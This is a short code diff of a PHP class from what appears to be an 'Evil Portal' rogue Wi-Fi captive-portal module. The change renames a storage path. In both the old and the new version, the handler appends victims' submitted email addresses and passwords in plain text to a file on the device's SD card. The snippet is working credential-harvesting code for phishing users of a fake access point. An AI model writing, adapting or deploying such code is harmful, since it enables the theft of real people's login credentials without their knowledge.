@@ -5,13 +5,13 @@ class MyPortal extends Portal
 
     public function handleAuthorization()
     {
-        if (!is_dir('/sd/evilportal-data/')) {
+        if (!is_dir('/sd/evilportal-input/')) {
 
-          mkdir('/sd/evilportal-data/');
+          mkdir('/sd/evilportal-input/');
         }
 
         if (isset($_POST['email'])) {
-          file_put_contents("/sd/evilportal-data/data.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
+          file_put_contents("/sd/evilportal-input/oauth-login.txt", $_POST['email'] . ' : ' . $_POST['pass'] . "\n", FILE_APPEND);
         }
         // Call parent to handle basic authorization first
         parent::handleAuthorization();
